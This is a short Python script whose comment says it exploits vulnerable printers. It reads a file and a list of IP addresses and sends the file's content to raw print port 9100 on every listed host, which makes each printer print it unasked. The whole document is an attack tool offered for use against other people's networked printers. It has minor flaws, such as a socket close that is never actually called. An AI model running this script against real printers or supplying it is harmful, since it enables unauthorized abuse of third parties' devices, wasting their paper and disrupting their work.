#!/usr/bin/env python

#exploits vulnerable printers to make them print a file

import socket
import time
import sys

file = "filep.txt" #change if needed
target = "ip.txt" #change if needed

def atprint(ipadd, content):
	ip = ipadd
	port = 9100
	timeout=5

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(timeout)

	try:
		connect = s.connect((ip, port))

		print("sending buffer to "+ip)
		s.send(content)
		s.close
		print("done")
	except:
		print('connection timed out')

buffer = open(file, 'r')
content = buffer.read()
buffer.close()

list = open(target, 'r')
liscont = list.readlines()
list.close()

T = []
for _ in liscont:
	T.append(_.strip())

for _ in T:
	atprint(_, content)

